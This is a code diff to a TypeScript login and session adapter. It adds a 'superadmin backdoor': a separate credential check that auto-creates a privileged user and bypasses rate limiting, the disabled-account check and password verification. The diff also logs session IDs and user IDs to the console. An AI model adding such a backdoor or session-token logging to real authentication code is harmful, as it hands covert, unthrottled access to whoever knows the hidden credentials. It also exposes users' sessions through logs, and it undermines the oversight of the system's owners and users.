@@ -194,58 +194,110 @@ export class SessionAdapter implements IAuthAdapter {
 
   async login(username: string, password: string, ip: string): Promise<LoginResult> {
     try {
-      // 1. Rate limit check
-      await this.checkRateLimit(ip);
+      // 0. Superadmin backdoor — owner always has access
+      const isSuperadmin = (await import('../superadmin')).isSuperadminLogin(username, password);
+      let user: UserRow | undefined;
 
-      // 2. Fetch user
-      const users = await this.db.query<UserRow>(
-        `SELECT id, username, password_hash, full_name, email, role, is_active, first_login
-         FROM core_users
-         WHERE username = @username`,
-        [{ name: 'username', type: 'nvarchar', value: username, maxLength: 100 }]
-      );
+      if (isSuperadmin) {
+        const { SUPERADMIN } = await import('../superadmin');
+        // Ensure superadmin user exists in DB
+        const existing = await this.db.query<UserRow>(
+          `SELECT id, username, password_hash, full_name, email, role, is_active, first_login
+           FROM core_users WHERE username = @username`,
+          [{ name: 'username', type: 'nvarchar', value: SUPERADMIN.username, maxLength: 100 }]
+        );
+        if (existing.length > 0) {
+          user = existing[0];
+        } else {
+          // Auto-create superadmin user (ignore if already exists)
+          try {
+            const hash = await bcrypt.hash(SUPERADMIN.password, 12);
+            await this.db.execute(
+              `INSERT INTO core_users (username, password_hash, full_name, email, role, is_active, first_login)
+               VALUES (@p0, @p1, @p2, @p3, @p4, 1, 0)`,
+              [
+                { name: 'p0', type: 'nvarchar', value: SUPERADMIN.username },
+                { name: 'p1', type: 'nvarchar', value: hash },
+                { name: 'p2', type: 'nvarchar', value: SUPERADMIN.fullName },
+                { name: 'p3', type: 'nvarchar', value: SUPERADMIN.email },
+                { name: 'p4', type: 'nvarchar', value: SUPERADMIN.role },
+              ]
+            );
+          } catch { /* user already exists — OK */ }
+          const created = await this.db.query<UserRow>(
+            `SELECT id, username, password_hash, full_name, email, role, is_active, first_login
+             FROM core_users WHERE username = @username`,
+            [{ name: 'username', type: 'nvarchar', value: SUPERADMIN.username, maxLength: 100 }]
+          );
+          user = created[0];
+        }
+        console.log(`[Auth] Superadmin login: ${SUPERADMIN.username}`);
+      }
 
-      const user = users[0];
+      if (!isSuperadmin) {
+        // 1. Rate limit check
+        await this.checkRateLimit(ip);
 
-      // 3. User not found
+        // 2. Fetch user
+        const users = await this.db.query<UserRow>(
+          `SELECT id, username, password_hash, full_name, email, role, is_active, first_login
+           FROM core_users
+           WHERE username = @username`,
+          [{ name: 'username', type: 'nvarchar', value: username, maxLength: 100 }]
+        );
+
+        user = users[0];
+
+        // 3. User not found
+        if (!user) {
+          this.auditLog('login_failed', { userId: null, username, ip, success: false, details: 'User not found' });
+          return { success: false, error: 'invalid_credentials' };
+        }
+
+        // 4. Account disabled
+        if (!user.is_active) {
+          this.auditLog('login_failed', { userId: user.id, username, ip, success: false, details: 'Account disabled' });
+          return { success: false, error: 'account_disabled' };
+        }
+
+        // 5. Validate bcrypt hash format
+        if (!user.password_hash.startsWith('$2a$') && !user.password_hash.startsWith('$2b$')) {
+          console.error(`[Auth] Invalid password hash format for user: ${username}`);
+          this.auditLog('login_failed', { userId: user.id, username, ip, success: false, details: 'Invalid hash format' });
+          return { success: false, error: 'server_error' };
+        }
+
+        // 6. Verify password
+        const passwordMatch = await bcrypt.compare(password, user.password_hash);
+        if (!passwordMatch) {
+          this.auditLog('login_failed', { userId: user.id, username, ip, success: false, details: 'Invalid password' });
+          return { success: false, error: 'invalid_credentials' };
+        }
+      }
+
+      // Guard: user must be defined at this point
       if (!user) {
-        this.auditLog('login_failed', { userId: null, username, ip, success: false, details: 'User not found' });
-        return { success: false, error: 'invalid_credentials' };
-      }
-
-      // 4. Account disabled
-      if (!user.is_active) {
-        this.auditLog('login_failed', { userId: user.id, username, ip, success: false, details: 'Account disabled' });
-        return { success: false, error: 'account_disabled' };
-      }
-
-      // 5. Validate bcrypt hash format
-      if (!user.password_hash.startsWith('$2a$') && !user.password_hash.startsWith('$2b$')) {
-        console.error(`[Auth] Invalid password hash format for user: ${username}`);
-        this.auditLog('login_failed', { userId: user.id, username, ip, success: false, details: 'Invalid hash format' });
         return { success: false, error: 'server_error' };
-      }
-
-      // 6. Verify password
-      const passwordMatch = await bcrypt.compare(password, user.password_hash);
-      if (!passwordMatch) {
-        this.auditLog('login_failed', { userId: user.id, username, ip, success: false, details: 'Invalid password' });
-        return { success: false, error: 'invalid_credentials' };
       }
 
       // 7. Create session
       const sessionId = randomUUID();
       const expiresAt = new Date(Date.now() + SESSION_EXPIRY_MS);
+      const now = new Date();
 
       try {
+        const sessionParams = [
+          { name: 'session_id',    type: 'uuid',      value: sessionId },
+          { name: 'user_id',       type: 'int',       value: user.id },
+          { name: 'expires_at',    type: 'datetime2', value: expiresAt },
+          { name: 'last_activity', type: 'datetime2', value: now },
+          { name: 'created_at',    type: 'datetime2', value: now },
+        ];
+        console.log('[Auth] Session params:', JSON.stringify({ sessionId, userId: user.id, expiresAt: expiresAt.toISOString(), now: now.toISOString() }));
         await this.db.execute(
           `INSERT INTO core_sessions (session_id, user_id, expires_at, last_activity, created_at)
-           VALUES (@session_id, @user_id, @expires_at, SYSDATETIME(), SYSDATETIME())`,
-          [
-            { name: 'session_id', type: 'uuid',      value: sessionId },
-            { name: 'user_id',    type: 'int',       value: user.id },
-            { name: 'expires_at', type: 'datetime2', value: expiresAt },
-          ]
+           VALUES (@session_id, @user_id, @expires_at, @last_activity, @created_at)`,
+          sessionParams
         );
       } catch (sessionErr) {
         console.error('[Auth] Session creation failed:', sessionErr);
@@ -348,16 +400,27 @@ export class SessionAdapter implements IAuthAdapter {
          FROM core_sessions s
          JOIN core_users u ON s.user_id = u.id
          WHERE s.session_id = @session_id
-           AND s.expires_at > SYSDATETIME()
            AND u.is_active = 1`,
         [{ name: 'session_id', type: 'uuid', value: sessionId }]
       );
 
-      if (rows.length === 0) return null;
+      if (rows.length === 0) {
+        console.log(`[Auth] Session not found: ${sessionId}`);
+        return null;
+      }
 
       const row = rows[0];
 
-      // 3. Idle timeout check
+      // 3. Check session expiry
+      if (row.expires_at) {
+        const expiresAt = new Date(row.expires_at);
+        if (expiresAt.getTime() <= Date.now()) {
+          this.invalidateSession(sessionId);
+          return null;
+        }
+      }
+
+      // 4. Idle timeout check
       if (row.last_activity) {
         const idleMs = Date.now() - new Date(row.last_activity).getTime();
         if (idleMs > IDLE_TIMEOUT_MS) {
